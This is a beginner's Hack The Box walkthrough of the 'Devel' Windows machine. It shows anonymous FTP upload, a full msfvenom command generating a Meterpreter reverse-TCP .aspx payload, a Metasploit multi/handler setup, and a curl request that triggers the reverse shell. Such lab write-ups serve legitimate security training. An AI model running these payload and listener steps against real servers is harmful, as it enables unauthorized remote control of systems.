---
title: Devel
date: 2020-05-09 11:29:00
description: Hack The Box Walkthrough
featured_image: '/images/blog/devel/devel.jpg'
tags: ['Hack The Box']
---

Here is another box from Hack the Box (HTB) that is simple and great for beginners. In Devel's box, I'll be using Metasploit and the open FTP port to upload a webshell to gain shell access on the machine.

## Hack the box

* Operating System: Windows
* Difficulty: Easy


## Information gathering

Let's start with the nmap scan. 

<img src="/images/blog/devel/ipaddress.jpg" alt="nmap scan">

And our results are in:

<img src="/images/blog/devel/nmapresults.jpg" alt="nmap results"> 

The results look interesting. We can see that port 21 (FTP) is open, and it allows for anonymous login.

I tried logging in using the anonymous login--success. There wasn't anything interesting inside the files, but I was able to upload a file onto the FTP server. Here's what I did:

<img src="/images/blog/devel/testupload.jpg" alt="uploading a file to ftp"> 

I also tried accessing the FTP service through the web browser so that I can use Burp Suite to see if I could gain more information about this box.

Taking a look at the HTTP header, we can see that it's running ASP.NET. Meaning, we will likely be able to run a .aspx file.

<img src="/images/blog/devel/httpheader.jpg" alt="http header"> 

Let's recap. We know two things right now:

* We can upload files onto the FTP server.
* FTP is running on ASP.NET, so we can add a .aspx file.


This might be enough for us to run an exploit. We can try uploading a payload generator with .aspx extension and gain the box via reverse shell. Let's give it a shot.

## Threat modelling

The first thing we should do is create a reverse payload, we can use msfvenom by typing in:

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > rev.aspx`

* `msfvenom`: Payload generator. 
* `-p`: Setting the payload. 
* `windows/meterpreter/reverse_tcp`: Payload selected. 
* `LHOST=10.10.14.24`: The IP address for lhost can be found in tun0 using ifconfig. 
* `LPORT=4444`: I just set it to 4444. 
* `-f`: Format that you'd like the payload to be saved in. 
* `aspx`: The format type. 
* `>`: All the information we just entered, will "go into..." 
* `rev.aspx`: The name of the file.

Once you press enter, the rev.aspx file will be located in your current directory. 

Next, we'll want to upload the file into the FTP service. 

<img src="/images/blog/devel/payloadftp.jpg" alt="adding payload to ftp"> 

Okay, we're pretty much ready to exploit the box. Let's start by opening up Metasploit.

## Exploitation

Once Metasploit opens, we can type in:

`use exploit/multi/handler`

This provides a listener that handles exploits that are launcehd outside of Metasploit. 

From there, I filled out the following:

* `set lhost tun0`: Sets the listening IP address.
* `set lport 4444`: This should be the LPORT you listed when we created the payload above.
* `options`: Good habit to make sure everything was filled.


Okay, it should be ready to go. We can use the `exploit` command to run it.

<img src="/images/blog/devel/metasploit.jpg" alt="metasploit multi handler"> 

It looks like it's working! We can now open the payload file that we uploaded earlier either through the web browser or by typing in another terminal window:

`curl http://10.10.10.5/rev.aspx`

Once we've opened the file, we can go back to our Metasploit terminal window--and look at that! We now have access to the box. As always, we can use the `shell` command to gain shell access, so that you can get the root.txt and user.txt file.

<img src="/images/blog/devel/shell.jpg" alt="shell access"> 

Great, another HTB machine completed.
